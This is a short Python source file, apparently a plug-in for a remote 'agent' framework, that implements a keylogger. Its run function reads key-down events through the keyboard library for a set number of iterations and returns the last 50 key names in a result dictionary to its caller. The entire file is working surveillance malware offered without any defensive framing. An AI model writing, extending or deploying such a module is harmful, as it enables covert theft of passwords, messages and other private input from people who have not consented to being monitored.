"""Keylogger module — captures keystrokes."""
import os, time
def run(args):
    duration = int(args.get('duration_seconds', 10))
    output = []
    try:
        import keyboard
        for _ in range(duration):
            ev = keyboard.read_event()
            if ev.event_type == 'down':
                output.append(ev.name)
            time.sleep(0.1)
    except ImportError:
        return {'status': 'stub', 'type': 'keylogger', 'duration': duration, 'count': 0, 'note': 'install keyboard module on agent'}
    except Exception as e:
        return {'status': 'error', 'error': str(e), 'type': 'keylogger'}
    return {'status': 'captured', 'type': 'keylogger', 'duration': duration, 'count': len(output), 'keys': output[-50:]}
